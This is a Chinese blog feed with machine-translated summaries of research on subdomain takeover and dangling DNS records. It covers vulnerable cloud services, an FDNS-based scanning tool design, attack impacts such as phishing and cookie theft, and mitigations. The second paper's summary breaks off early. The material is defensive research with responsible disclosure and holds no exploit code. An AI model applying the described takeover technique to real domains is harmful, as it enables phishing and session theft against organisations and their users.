bucket的链接，用于从中服务对象（文件）。当创建新的CloudFront发行版时，会生成一个唯一的子域来提供访问[Ama17c]。此子域的格式为SUBDOMAIN.cloudfront.net. 子域部分由CloudFront生成，不能由用户指定。</p><p>除了随机生成的子域之外，CloudFront还可以指定一个备用域名来访问发行版[Ama17c]。这是通过创建从备用域名到CloudFront生成的子域的CNAME记录来实现的。尽管Amazon没有提供关于内部CloudFront概念的文档，但是可以从它的行为中扣除高层架构。根据地理位置，DNS查询到cloudfront.net导致相同的A记录（在同一区域）。这表明CloudFront正在后台使用虚拟主机设置。在HTTP请求到达后，CloudFront的边缘服务器根据HTTP主机头确定正确的分发。文档也支持这一理论，因为它指出：“如果备用域名已经存在于另一个CloudFront发行版中，即使您的AWS帐户拥有另一个发行版”“[Ama17c]，您也不能向CloudFront发行版添加备用域名。”。有多个备用域指向一个分发是正确的，但是在多个分发中有相同的备用域名是不正确的。图5.4说明了这一概念。</p><p>因此，为了正确地处理备用域名，CloudFront需要事先知道备用域名附加到哪个发行版。换句话说，配置CNAME记录是不够的，需要在分发设置中显式设置备用域名</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns27.jpg" alt="此处输入图片的描述"><br>图5.4:CloudFront的高层架构。用户发出HTTP请求后，使用映射表正确确定S3 bucket。</p><p>CloudFront中备用域名的问题与第5.1节中解释的问题类似。我们假设sub.example.com CNAME记录设置为d1231731281.cloudfront.net. 当没有sub.example.com 在任何CloudFront发行版中注册为备用域名，子域接管是可能的。任何人都可以创建一个新的发行版和sub.example.com网站作为其设置中的备用域名。但是请注意，新创建的CloudFront子域不需要与CNAME记录（d123731281）中指定的子域匹配 .cloudfront.net). 由于CloudFront使用虚拟主机设置，因此正确的分发是使用HTTP主机头而不是DNS记录来确定的。</p><p>图C.2显示了对备用域名的HTTP请求后出现的错误消息，该域名已将DNS CNAME记录保存到CloudFront，但未在任何CloudFront发行版中注册。此错误消息非常强烈地指示了子域接管的可能性。然而，需要考虑两个例外情况：</p><ul><li><p>仅限HTTP&#x2F;HTTPS发行版<br>CloudFront允许指定分发是HTTP-only还是HTTPSonly。将HTTP转换为HTTPS可能会为某些发行版提供正确的响应。</p></li><li><p>禁用分配</p></li></ul><p>某些分发可能被禁用。禁用的分发不再主动为内容提供服务，同时仍保留其设置。但是，在域内注册了一个替换的HTTP分发，这意味着它可能在域内注册了一个错误消息，这意味着它在域内没有被注册错误。确定替代域是否</p><p>是注册在某个分发内部的，是为了创建一个新的分发并设置备用域名。如果注册过程没有抛出错误，则自定义域容易被子域接管。图5.5显示了用户尝试注册其他CloudFront发行版中已经存在的备用域名后出现的错误</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns28.jpg" alt="此处输入图片的描述"><br>图5.5:AWS门户在创建分发版期间显示的错误消息。如果其他分发版中已存在备用域名，则会向用户显示此消息。</p><p>在第5.3节中，介绍了一种自动检测CloudFront中可能的子域接管的方法。</p><h4 id="5-2-2-其他"><a href="#5-2-2-其他" class="headerlink" title="5.2.2 其他"></a>5.2.2 其他</h4><p>即使在云计算域的子域名注册不可用的情况下，云域的接管也是可能的。然而，由于云服务提供了一种指定备用域名（CNAME记录）的方法，子域接管的可能性仍然存在。本节简要介绍了与CloudFront（虚拟主机架构）非常相似的其他云服务。附录C给出了以下云服务上不存在的备用域名的错误消息。</p><ul><li><p>Amazon S3<br>Amazon S3在第5.2.1小节中进行了简要介绍。用于访问bucket的默认基域并不总是相同的，它取决于所使用的AWS区域。amazonS3基本域的完整列表在AWS文档4中提供。与CloudFront类似，amazonS3允许指定备用（自定义）域名来访问bucket的内容[Ama17a]。</p></li><li><p>Heroku</p></li></ul><p>Heroku是一个平台即服务提供商，它支持使用简单工作流部署应用程序。由于需要访问应用程序，Heroku公开使用在上形成的子域的应用程序herokuapp.com网站.但是，也可以指定自定义域名来访问部署的应用程序[Her17]。</p><ul><li>Shopify</li></ul><p>Shopify提供了一种在云中创建和定制电子商务商店的方法。<br>将在上创建访问存储的默认子域myshopfify.com网站. 如前所述，shoppify允许指定备用域名[Sho17]。值得注意的是Shopify验证了正确的CNAME记录配置。但是，这个验证不是域所有权验证。Shopify只检查备用域的DNS区域中存在的正确CNAME记录。因此，这种验证不会阻止子域接管。</p><ul><li>GitHub</li></ul><p>GitHub是Git的版本控制存储库。GitHub还允许使用GitHub页面项目进行免费的web托管。这种web宿主通常用于项目的文档、技术博客或开放源代码项目的支持网页。<br>GitHub Pages除了支持下的默认域名外，还支持自定义域名github.io[吉特17]。</p><ul><li>WP Engine</li></ul><p>WP引擎是Wordpress的托管提供程序。与其他云服务类似，WP Engine在wpeengine.com网站但也可以指定自定义域名[wp17]。</p><ul><li>Microsoft Azure</li></ul><p>微软Azure是一个更大的云提供商，类似于AWS。与上面提到的云服务不同，它不提供虚拟主机架构。简单地说，对于每一个云服务，Azure都会用自己的IP地址创建自己的虚拟机。因此域名和IP地址之间的映射是明确的（一对一的映射）。值得注意的是，由于这不是常规的虚拟主机设置，配置CNAME记录不必在资源设置中明确定义。Azure提供了多种云服务，但是本文讨论的云服务的默认域是cloudapp.net以及azurewebsites.net网站. 它的文档描述了使用A或CNAME记录（指向前面提到的两个域之一）来设置域名和Azure资源之间的链接。一个有趣的观察是，对于A记录，Azure使用TXT记录[LS17]进行域所有权验证。然而，CNAME记录并非如此，因此即使在Microsoft Azure的情况下，子域接管也是可能的</p><h3 id="5-3-用于子域接管检测的FDNS"><a href="#5-3-用于子域接管检测的FDNS" class="headerlink" title="5.3 用于子域接管检测的FDNS"></a>5.3 用于子域接管检测的FDNS</h3><p>fdns可以用来显示Internet上子域接管的流行程度。<br>因为fdns已经包含已解析的CNAME记录，所以通过Internet自动扫描子域接管非常简单。为此，开发了一种自定义扫描工具。本节介绍了它的设计和结果。</p><p>该工具完全用Python编写，仅适用于CNAME记录。它将从fdns中提取的CNAME记录作为输入，并将易受子域接管的记录输出。但是请注意，输入不一定需要来自fdns。支持提供的任何使用FDNS语法的输入。</p><p>输入应为每行一个JSON，格式如下（FDNS）：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns29.jpg" alt="此处输入图片的描述"></p><p>其中时间戳和类型字段是可选的。反过来，该工具以以下格式生成输出（同样，每行一个JSON）：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns30.jpg" alt="此处输入图片的描述"></p><p>该工具旨在提供一个插件系统。插件代表单个云服务的验证模块。基于特定云服务对不存在的资源实现错误处理的方法，有两种类型的验证插件：</p><ul><li>HTTP验证器</li></ul><p>这些插件需要向云服务发出HTTP请求，以确定域名是否易受子域接管攻击。<br>如附录C所示，每个云服务都有其独特的模式来表示不存在的备用域名。HTTP验证程序正在检查HTTP响应中是否存在字符串，例如此应用程序不存在，以便验证子域接管。值得注意的是，HTTP请求的目的地是规范域名后面的IP地址。但是，HTTP主机头需要设置为源域名。这种细微的差别是显著的，因为没有它，几乎所有的HTTP验证器都会提供错误的结果。</p><ul><li>DNS 验证器</li></ul><p>这些插件只需要DNS请求（检查NXDOMAIN）即可验证子域接管。Microsoft Azure是一个可以使用DNS验证器的服务示例。</p><p>正确的插件是根据用于规范域名的正则表达式来选择的（例如，以cloudfront.net使用CloudFront verificator进行验证）。支持前面章节中提到的所有云服务。提供了完整的插件列表。</p><p>该工具还包含一个能力，以验证CNAME记录，其中规范的域名是常规的Internet域。域可用性检查是使用aws5提供的CheckDomainAvailability API完成的。但是，需要考虑的是，AWS可能会对这个API启用速率限制。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns31.jpg" alt="此处输入图片的描述"><br>图5.6：工具设计的简化说明</p><h4 id="CNAME记录链"><a href="#CNAME记录链" class="headerlink" title="CNAME记录链"></a>CNAME记录链</h4><p>在某些情况下，CNAME记录可能会形成CNAME记录链。让我们拥有域名sub.example.com网站有CNAME记录sub.example1.com。如果反过来，sub.example1.com有一个CNAME记录sub.example2.com形成一个三向链：</p><pre><code class="hljs">sub.example.com -&gt; sub.example1.com -&gt; sub.example2.com</code></pre><p>在这种情况下，当链中最后一个域（example2.com）的基域可用于注册时sub.example1.com和sub.example.com网站受到影响。幸运的是，FDNS隐式包含链中的所有CNAME引用。对于上面给定的链，即使没有来自sub.example.com网站到sub.example2.com，FDNS包含此记录。因此，不需要对自动化工具进行直接更改，以支持fdns中的CNAME记录链。</p><h4 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h4><p>由于FDNS目前（2017年11月）包含约1800万CNAME记录，因此此类数据的处理必须高效。自动化工具的主要瓶颈是网络流量（在执行域验证时），即进程受i&#x2F;O限制。使用并行性将进程划分为多个核心是不必须加快执行速度，因为在这种情况下，CPU功率不是主要瓶颈。这就是为什么使用Gevent的并发性被集成到工具中。</p><p>Gevent正在研究greenlets的概念[Bil15]。greenlet是与操作系统进程类似的轻量级执行单元（协程）。主要区别在于greenlet是由gevent调度的，而不是操作系统本身。gevent和greenlets的想法是提供异步执行。换句话说，多个任务（greenlets）一次启动，结果以先到先得的方式处理。这为I&#x2F;O绑定进程节省了时间，因为可以在开始时打开多个网络连接，并且在响应到来时按顺序处理结果。另一方面，正常的同步处理打开一个连接，处理它的响应，然后才打开另一个连接。图5.7说明了网络相关任务的同步和异步执行之间的区别。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns32.jpg" alt="此处输入图片的描述"><br>图5.7：同步和异步执行之间的区别。三个连接，三个执行单元。请注意，同步执行中这些连接所需的总时间为11，而异步执行中则为5。</p><p>本章介绍的工具使用gevent.Pool。这个构造允许将多个greenlet作为一个组来处理。我们的想法是在任何给定的时间都有多个连接打开时间。返回其中一个连接的响应后，将处理其数据，并自动由另一个连接替换，以保持组的固定大小。</p><p>至少有三种开源工具可用于子域接管验证：subpack 、HostileSubBruteforcer 和xcname 。尽管上述项目包含验证类似云服务集的能力，但它们并没有针对大量记录（如fdns中的记录）进行优化。因此，需要定制自动化工具。本章介绍的工具提供了相当简单的体系结构。当一个新的云服务没有正确的域验证被识别时，只需要一个新的验证插件来支持这个云服务。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>扫描fdns中的所有CNAME记录（大约3000万条记录）对AWS中的域可用性检查器造成了显著的压力。决定只扫描其中一个受支持的云提供商拥有规范名称的CNAME记录。这似乎是一个过度受限的扫描，然而，云提供商在fdns中生成了大部分CNAME记录。</p><p>在2017年11月3日的FDNS数据集中，CNAME记录中的12888个源域名容易被子域接管。图5.8显示了受影响记录中规范域名中云提供商的分布情况。请注意，扫描FDNS中的所有CNAME记录肯定会导致更易受攻击的源域名。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns33.jpg" alt="此处输入图片的描述"></p><p>由于结果数量多，因此使用了域名的优先顺序策略。Alexa 100万实际上是一个标准数据集，学术论文中使用它来获得互联网上100万个最流行网站&#x2F;域的列表。由于Alexa不再免费提供更新的数据集，因此在本节中使用了另一个名为Majestic Million 10的数据集。</p><p>从FDNS中发现的所有可能的子域接管中，选择了10个具有最高百万级的样本进行演示。向每个域的管理员发送了一封说明问题和可能的缓解策略（见第5.5节）的通知电子邮件。附录D显示了此类通知电子邮件。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns34.jpg" alt="此处输入图片的描述"><br>表5.1：容易被子域接管的域名。Column Rank代表2017年11月以来base domain在Majest Million list中的位置。</p><p>出于法律上的考虑，本文没有列出受影响的具体领域。这些域名中的一些尚未减轻子域名的收购，其他域名则不允许披露问题。</p><h3 id="5-4-启示"><a href="#5-4-启示" class="headerlink" title="5.4 启示"></a>5.4 启示</h3><p>在解释了子域接管及其使用fdns的演示之后，本节讨论了攻击者接管某个合法域后存在的现实含义。刘等。在他们的论文[LHW16]中对后果进行了全面的解释。本节尝试使用不同的场景和示例来扩展它们的解释。</p><h4 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h4><p>攻击者经常使用排版[Szu+14]或所谓的Doppelganger域[GK11]来模仿合法的域&#x2F;网站进行网络钓鱼。排版是一种注册域名的技术，它看起来像一些合法的域名。</p><p>例如给定谷歌，键入域名的一个例子可能是g00gle.com网站（注意“0”而不是“o”）。这样的域名看起来和原来的一样。<br>doppelganger域类似于排版域。域名中缺少“.”（点）的域。例如，的Doppelganger域的实例mail.google.com是邮箱google.com（注意丢失的点）。当这些域上的内容与原始网站的品牌和内容相匹配时，用户无法分辨两者的区别，更有可能被攻击者欺骗（例如，获取凭证或财务欺诈）。</p><p>在攻击者接管某个合法域名后，普通用户几乎不可能分辨出该域上的内容是由合法方还是攻击者提供的。以随机银行为例。如果银行的某个子域易受子域接管的攻击，攻击者可以创建一个HTML表单，该表单模仿银行互联网银行系统的登录表单。然后，攻击者可以运行鱼叉式网络钓鱼或大规模网络钓鱼活动，要求用户登录并更改密码。</p><p>在这个阶段，密码被控制相关域的攻击者捕获。仿冒电子邮件中提供的URL是银行的合法子域。因此，用户没有意识到有恶意的事情发生。垃圾邮件过滤器和其他安全措施也不太可能触发垃圾邮件或恶意电子邮件，因为它包含具有更高信任度的域名。</p><p>通过生成有效的SSL证书可以增强此攻击。允许对证书的所有权进行自动验证（如图9.5）。也就是说，如果在特定的URL路径上有一个特定的内容，那么我们Encrypt将批准为给定域颁发证书[Let]。由于攻击者完全控制了容易被子域接管的域的内容，因此可以在几分钟内完成此验证。因此，攻击者还能够为此类域生成SSL证书，这只会降低钓鱼攻击的嫌疑。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%20dns35.jpg" alt="此处输入图片的描述"><br>图5.9:Let’s Encrypt verification[Let]的简化过程。</p><p>（CNAME）子域接管的另一个问题是，它还允许接收和发送来自受影响域的电子邮件。CNAME记录代表每个DNS资源记录，MX也不例外。这意味着邮件服务器可以设置在一个被占用的域上，攻击者将接收所有针对该域的电子邮件。发送电子邮件也没什么区别。SPF、DKIM和DMARC记录可以在TXT记录中配置（TXT也被委派）。对于通常需要回复原始电子邮件的鱼叉式网络钓鱼攻击，具有从目标发送和接收电子邮件的能力更为关键。</p><p>2015年，Ubiquiti Network因钓鱼电子邮件欺骗CEO而损失4600万美元。攻击者的载体包括带有更改回复地址的鱼叉式网络钓鱼电子邮件，以接收来自受害者的进一步响应。一旦攻击者接管了合法域，则不需要更改回复地址，攻击者成功的几率更高。</p><p>在现实世界中，子域名收购的一个例子是发生在唐纳德·特朗普的一个域名上的事件。一个黑客可以接管secure2.donaldjtrump.com网站在2017年初[Bis17]。尽管黑客没有利用这个网站进行网络钓鱼，但它可能被用来对唐纳德·特朗普的总统竞选活动造成伤害。</p><p>另一个例子是Frans Rosén[Ros14]在2014年创建的bug bounty报告。在本报告中，域名media.vine.com（流行视频网站）很容易被子域名收购。可能的情况可能与上述银行解释的类似：攻击者可能建立类似于vine.com网站并获取用户凭据。</p><p>但是请注意，上面解释的一些场景仅适用于规范的域名，这些域名是常规的Internet域。例如，如果域指向AWS CloudFront，就没有机会接收到该域的电子邮件。</p><h4 id="跨站脚本"><a href="#跨站脚本" class="headerlink" title="跨站脚本"></a>跨站脚本</h4><p>Cookie是在web浏览器中存储临时信息的一种方式[Bar11]。由于HTTP是一个无状态协议，所以cookies被用来跟踪发送到服务器的不同请求之间的会话信息。例如，当用户登录到一个网站时，一个唯一的cookie（称为会话cookie）存储在用户的web浏览器中。此会话cookie随每个即将到来的HTTP请求一起发送。服务器可以使用会话cookie向特定用户发送HTTP请求。访问会话cookie通常意味着在分配该会话cookie的web应用程序上下文中拥有用户的授权。因此，浏览器可以通过几种方式限制cookie：</p><p><strong>Same domain policy</strong></p><p>一个特定域发出的cookie只能由驻留在同一域上的web服务器访问。本政策的一个例外情况将在下文进一步解释。</p><p><strong>HttpOnly cookie</strong></p><p>默认情况下，在创建cookie的网站上下文中运行的Javascript代码可以访问Cookies。Javascript可以读取、更新和删除cookies。HttpOnly cookie标志（由web服务器设置）表示Javascript代码无法访问特定的cookie。获取它的唯一方法是通过HTTP请求和响应头。</p><p><strong>Secure cookie</strong></p><p>当cookie具有由web服务器设置的安全标志时，只有在使用HTTPS的情况下才能将其通信回web服务器。<br>如果域容易被子域接管，攻击者可以通过诱骗用户访问该网站来收集该域过去发布的cookie。HttpOnly和Secure标志不会有帮助，因为不能使用Javascript访问cookie，而且很容易为所占用的域生成SSL证书。</p><p>Cookie也可以跨子域共享。这通常发生在网站使用基于cookie的单点登录（SSO）系统时。使用SSO，用户可以使用一个子域登录，并跨多个子域共享同一会话令牌。设置常规cookie的语法如下：</p><pre><code class="hljs">HTTP/1.1 200 OKSet-Cookie: name=value</code></pre><p>如果此cookie是由驻留在example.com网站，以后只能访问此服务器上的cookie。但是，可以通过以下方式为通配符域（出于上述原因）发出cookie：</p><pre><code class="hljs">HTTP/1.1 200 OKSet-Cookie: name=value; domain=example.com</code></pre><p>cookie将包含在对的HTTP请求中example.com网站也包括任何其他子域，如subdomain.example.com. 这种行为可能导致使用子域接管的高严重性攻击。假设某个特定域正在使用通配符域的会话cookie。如果有一个子域容易被子域接管，那么收集用户会话令牌的唯一方法就是诱使他或她访问该易受攻击的子域。会话cookie随第一个HTTP请求自动发送。</p><p>这种技术在Arne Swinnen[Swi16]的bug bounty报告中得到了解释。报告解释了泛素网络的一个子域的问题(ping.ubnt.com). 此子域容易被子域接管，指向无人认领的AWS CloudFront分发。由于Ubiquiti Networks将SSO与通配符会话cookies一起使用，所有用户访问ping.ubnt.com他们的会话cookie可能被偷了。即使这个域指向AWS CloudFront，CloudFront分发设置允许在每个请求中记录cookie。因此，即使子域指向AWS CloudFront，提取会话cookie的场景也是完全可能的。2017年，Swinnen还对Uber的SSO系统[Swi17]进行了类似的攻击。</p><p>上面解释的行为不仅限于cookies。由于Javascript脚本完全控制了网站，所以它们是在运行的，如果能够在合法网站上替换这些脚本，可能会导致灾难性的后果。假设网站使用外部提供者的Javascript代码，使用script标记和src属性。当外部提供程序的域过期时，浏览器会自动失败，即不会触发对普通用户可见的任何警报。如果外部代码没有做任何重要的事情（例如，它只用于跟踪），那么外部提供者可能会在网站上停留很长一段时间。攻击者可以接管这个过期的域，匹配提供的Javascript代码的URL路径，从而控制访问原始网站的每个访问者。</p><p>2017年，一名攻击者控制了加密货币矿业公司CoinHive[Osb17]的DNS记录。CoinHive提供了web开发人员可以在其网站上包含的Javascript文件。这些文件用于加密货币挖掘目的-当用户停留在网站上时，她的浏览器同时用于挖掘。这项技术正被用来代替常规广告来产生收入。由于CoinHive管理员的密码泄露，攻击者能够更改DNS记录至少6个小时。更改的DNS记录用于提供CoinHive的Javascript文件的更新版本，该文件直接向攻击者提供挖掘收入。尽管攻击者并没有将子域接管作为攻击媒介，但此事件会发出红色警报，表明此类攻击确实正在发生。</p><p>但是，有一种方法可以保护浏览器中Javascript文件的完整性。<br>子资源完整性被提出作为一种机制，包括加密哈希作为HTML5[Akh+16]中脚本标记的属性完整性。当提供的加密哈希与下载文件不匹配时，浏览器拒绝执行它。</p><h3 id="5-5-缓解"><a href="#5-5-缓解" class="headerlink" title="5.5 缓解"></a>5.5 缓解</h3><p>对于已经易受子域接管影响的域名，其缓解策略相当简单：</p><ul><li>删除受影响的DNS记录<br>最简单的解决方案是从DNS区域删除受影响的记录。如果组织确定不再需要受影响的源域名，则通常使用此步骤。</li><li>声明规范域名<br>这意味着在特定的云提供商中注册资源，或者在常规Internet域的情况下，购买过期的域。</li></ul><p>为了防止将来发生子域接管，组织应该改变在其基础结构中创建和销毁资源的过程。在创建资源的情况下，DNS记录创建必须是此过程的最后一步。这种情况可防止DNS记录在任何时间点指向不存在的域。对于资源销毁，则相反：在这个过程中，需要删除DNS记录作为第一步。</p><p>云提供商的缓解策略也应考虑在内。正如在本章中看到的，一些云服务没有验证域所有权。这背后的原因主要是方便。云提供商没有通过验证源域名的所有权而引入任何漏洞。因此，由用户来监视自己的DNS记录。</p><p>以下是云提供商的两个示例，其中包括作为CNAME委派一部分的域所有权验证：</p><ul><li><p>Google Cloud Platform (GCP)<br>GCP需要使用TXT记录[Goo17a]验证域所有权。Google生成一个唯一的字符串，管理员需要在配置备用域名后将其放入TXT记录中。然后，Google查询有问题的域名，以验证这个字符串是否存在于DNS响应中。</p></li><li><p>Squarespace</p></li></ul><p>与GCP类似，Squarespace需要使用额外的CNAME记录[Squ17]进行域所有权验证。</p><p>以上两个例子都阻止了子域接管。因为攻击者没有访问源域名的完整DNS区域的权限，她将无法将特定的DNS记录放在那里。这些云提供商拒绝在没有适当的域所有权验证的情况下处理CNAME委派。值得注意的是，尽管存在域验证，Evgeny Morozov在2017年证明了在某些情况下可以绕过域验证[Mor17]。他使用了一种相当简单的DNS欺骗技术，包括主动向验证服务器发送DNS响应。</p><h2 id="0x06-结论"><a href="#0x06-结论" class="headerlink" title="0x06 结论"></a>0x06 结论</h2><p>本文对网络安全环境下的域名进行了分析。主要涉及两个主题：域关联和子域接管。</p><p>首先，对公共DNS数据集进行比较，以选择合适的数据集。即使有多个公共DNS数据集，Rapid7转发DNS数据集（FDNS）被选择、描述和广泛分析。FDNS作为第4章和第5章中解释的主题的基础。</p><p>第四章定义了垂直域相关和水平域相关。这两种方法都被新的技术所扩展，这些技术以FDNS为主要数据源。已知技术和使用fdns的技术之间的比较可在其特定章节中找到。比较结果表明，将已知技术与FDNS相结合可以获得更好的域相关结果。本文还为每种演示的技术提供了易于使用的脚本。这些技术应该有助于组织从网络对手的角度看待自己的公开曝光。</p><p>FDNs也作为第5章中描述的子域接管分析的基础。子域名收购仍然是网络安全领域一个不断发展的话题。这篇论文扩展了已经发表的研究和新的现实世界的例子及其启示。第5.4节指出，涉及子域接管的攻击并非纯粹理论上的。作为分析的一部分，确定了知名组织拥有的几个易受攻击的领域。这些组织通过可能的缓解策略，主动了解这一问题。</p><p>虽然子域接管的缓解是一个相当简单的过程，但它往往涉及到人为因素。随着云服务的进一步利用，子域接管漏洞将继续增长。对于云提供商应该如何进行域所有权验证，仍然存在一个悬而未决的问题。实际上，域所有权验证过程使云服务注册过程复杂化。然而，正确的域所有权验证过程也可以减轻子域接管。很有意思的是，看看云提供商是否会开始采用它。</p><p>域关联和子域接管结果都表明，FDNS是一个强大的数据集，它提供了大量的信息。截至目前（2017年11月），利用FDNS的公开项目并不多。希望本文能成为一个开创性的范例，为DNS相关研究提供新的视角。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>原文：</p><p><a href="https://is.muni.cz/th/byrdn/Thesis.pdf">https://is.muni.cz/th/byrdn/Thesis.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>了解悬挂DNS记录的安全威胁</title>
    <link href="/2020/08/02/%E4%BA%86%E8%A7%A3%E6%82%AC%E6%8C%82DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81/"/>
    <url>/2020/08/02/%E4%BA%86%E8%A7%A3%E6%82%AC%E6%8C%82DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-摘要"><a href="#0x00-摘要" class="headerlink" title="0x00 摘要"></a>0x00 摘要</h2><p>在悬挂的DNS记录（Dare）中，DNS记录指向的资源无效，但该记录本身尚未从DNS中清除。在这篇论文中，我们忽略了DNS在很大程度上构成的威胁。我们的研究表明，Dare很容易被对手操纵以进行域劫持。特别是，我们确定了<strong>三个攻击向量</strong>，对手可以利用它们来利用Dare。在一项大规模的测量研究中，我们在277个Alexa top 10000域和52个edu区域中发现了467个可利用的Dare，表明Dare是一个真正的、普遍的威胁。通过利用这些Dare，对手可以完全控制（子）域，甚至可以让它们与证书颁发机构（CA）签署。很明显，可利用DARE的根本原因是<strong>缺乏对DNS记录所指向的资源的真实性检查</strong>。然后，我们提出了三种防御机制来有效地减轻DARE，而不需要人力。</p><p>关键词：DNS；悬挂记录；域劫持</p><h2 id="0x01-摘要"><a href="#0x01-摘要" class="headerlink" title="0x01 摘要"></a>0x01 摘要</h2><p>域名系统（DNS）作为Internet最重要的组成部分之一，不仅提供了重要的命名服务，而且为访问Internet服务提供了基本的信任锚。</p><p>因此，它一直是攻击者的目标[28]、[42]、[43]。为了保证DNS系统的真实性和完整性，人们付出了巨大的努力来保护客户端和服务器机制[30]、[32]、[52]、[55]。特别是，已经部署了一套安全机制，如DNSSEC[27]，以保护DNS服务器和客户端之间的通信通道。然而，<strong>对DNS服务器和DNS记录所指向的那些资源之间的链接进行身份验证的关注很少</strong>。</p><h3 id="新的威胁"><a href="#新的威胁" class="headerlink" title="新的威胁"></a><strong>新的威胁</strong></h3><p>在本文中，我们研究了DNS中一个被忽视的威胁：一个悬空的DNS记录（Dare），由于缺乏对解析资源的真实性检查，该记录很容易被利用进行域劫持。DNS记录，表示为一个元组<code>&lt;name, TTL, class, type, data&gt;</code>,<strong>本质上是一个指针</strong>，其中数据字段指向承载name字段资源的计算机。与程序中的指针类似，DNS记录也可能成为悬挂的。当“name”字段访问的服务中断时，域所有者将释放数据字段指向的计算机，并应清除相关的DNS记录。不幸的是，在实践中，域所有者经常忘记进行清理，从而导致<strong>DNS记录悬空</strong>。传统观点认为，Dare大体上是安全的。</p><p>为了更好地理解这种威胁，我们首次对野外可利用的Dare（不安全的Dare）进行了全面研究。特别是，我们的研究表明，Dare是一种真正的、普遍存在的威胁</p><p>我们通过仔细研究DNS规范开始我们的研究，在此期间确定了<strong>四种安全敏感的Dare</strong>，包括Dare-A、Dare-CN、Dare-MX和Dare-NS。为了利用不安全的数据，对手需要控制DNS记录的数据字段中的资源。Dares中有两种类型的资源：<strong>IP地址和域名</strong>。我们提出了<strong>三个攻击载体</strong>，对手可以利用它们来劫持这些资源。</p><p>（1） 在第一个攻击向量中，我们观察到云平台已经成为现代网站的流行选择。在云中，物理资源，特别是公共IP地址池，在所有客户之间共享。不幸的是，在实践中，许多域管理员错误地信任这些短暂的、可公开分配的资源，从而可能产生各种类型的Dare。从某种意义上说，这种攻击向量是基于概率的，因为云中的IP分配通常是随机的。<br>（2） 现代网站广泛使用第三方服务。要将第三方服务集成到网站中，域所有者需要在权威DNS（aDNS）服务器中添加a或CNAME记录，并在所有者的第三方服务帐户上声明（子）域的所有权。任何成功声明（子）域所有权的服务帐户都可以控制该（子）域的内容。令人惊讶的是，大多数第三方服务都不验证这样的声明，这意味着对手可以潜在地声明和控制任何（子）域，这些域已被其原始所有者放弃。因此，第二个攻击媒介是<strong>寻找与被遗弃的第三方服务有关的Dare</strong>。<br>（3） 由于域可能过期[46]，第三个攻击向量只是<strong>在DNS记录的数据字段中搜索过期的域</strong>。</p><h3 id="大规模测量研究"><a href="#大规模测量研究" class="headerlink" title="大规模测量研究"></a><strong>大规模测量研究</strong></h3><p>根据这三种攻击媒介，我们评估了野外不安全的Dare。<br>我们对四个数据集进行了大规模的测量，其中一个包含Alexa top 100万跨7年的apex域，另三个分别包含Alexa top 10000、2700 edu和1700 gov区域的子域。对于第一个攻击向量，我们开发了一个名为ipscout的简单工具，可以在云中自动输入IP地址，特别是两个最大的云，amazonec2<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%812.jpg">2</a>和microsoftazure<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8116.jpg">17</a>。到期由于其概率性，IPScouter无法枚举整个IP地址空间。因此，我们通过过滤所有活动IP地址来评估潜在的Dare。对于第二种攻击向量，我们测量了九种最流行的第三方服务。对于第三个攻击向量，我们交叉检查WHOIS数据和域注册器以识别这些过期的域。</p><p>在我们的研究中，共有591个测试成功地证实了这一点。特别是，所有四个数据集中都存在Dare，这表明存在广泛的威胁。更令人担忧的是，在335个高价值区域中可以找到DARE，包括edu、gov和Alexa top 10000。通过利用这些胆量，对手可以显著增强多种形式的欺诈活动（例如，垃圾邮件、鱼叉钓鱼和cookie劫持）。</p><p>随着自动化和免费的证书颁发机构（CA）的出现，如Let’s Encrypt<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8114.jpg">15</a>，对手甚至可以让黑客子域签名，并建立一个“真正的”HTTPS网站。</p><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" 